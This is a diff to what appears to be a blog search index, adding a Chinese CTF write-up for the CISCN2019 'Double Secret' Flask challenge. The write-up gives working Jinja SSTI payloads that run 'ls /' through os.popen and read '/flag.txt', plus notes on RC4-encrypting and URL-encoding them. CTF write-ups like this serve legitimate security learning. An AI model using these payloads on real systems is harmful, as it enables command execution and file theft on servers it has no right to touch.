@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>刷题笔记:[CISCN2019 华东南赛区]Double Secret</title>
+      <link href="/p/1231048582.html"/>
+      <url>/p/1231048582.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="刷题笔记-CISCN2019-华东南赛区-Double-Secret"><a href="#刷题笔记-CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="刷题笔记:[CISCN2019 华东南赛区]Double Secret"></a>刷题笔记:[CISCN2019 华东南赛区]Double Secret</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[rc4|ssti|flask]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211302124.png" alt="image-20210720211302124"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>就是靠灵光一闪</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211632653.png" alt="image-20210720211632653"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211704135.png" alt="image-20210720211704135"></p><p>buu上的题最近不知道为啥，浏览器里敲连接必触发dns rebind attack检测，真的烦</p><p>输到12345的时候报错了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211917580.png" alt="image-20210720211917580"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720212233582.png" alt="image-20210720212233582"></p><p>rc4算法，密钥HereIsTreasure</p><p>试试?secret=a,结果为4，试了网上好几个在线rc4加密的，<a href="http://tool.chacuo.net/cryptrc4%E5%B0%B1%E8%BF%99%E4%B8%AA%E7%BB%93%E6%9E%9C%E4%B8%80%E8%87%B4">http://tool.chacuo.net/cryptrc4就这个结果一致</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720212708801.png" alt="image-20210720212708801"></p><p>果然。</p><p>flask+template，怀疑是ssti</p><p>蛮怪的，明明是加密，注释又写个解密。</p><p>那大概就是检测加密字符输出解密，检测未加密字符输出加密。</p><p>查文件</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;&#39;).read()&#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在flag.txt里</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720221827489.png" alt="image-20210720221827489"></p><p>于是读/flag.txt</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;flag.txt&#39;).read()&#125;&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接打肯定是不行的，需要先rc4加密，加密后有很多不可视字符，所以再urlencode一下</p><p>注意把<code>encode all special chars</code>点上，不然#等字符不会被urlencode，get传值就出问题了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720222043615.png" alt="image-20210720222043615"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Web </tag>
+            
+            <tag> SSTI </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>刷题笔记:[RootersCTF2019]I_&lt;3_Flask</title>
       <link href="/p/2417191136.html"/>
       <url>/p/2417191136.html</url>
@@ -231,9 +260,9 @@
             
             <tag> Web </tag>
             
-            <tag> disable_functions </tag>
-            
             <tag> PHP代码审计 </tag>
+            
+            <tag> disable_functions </tag>
             
         </tags>
       
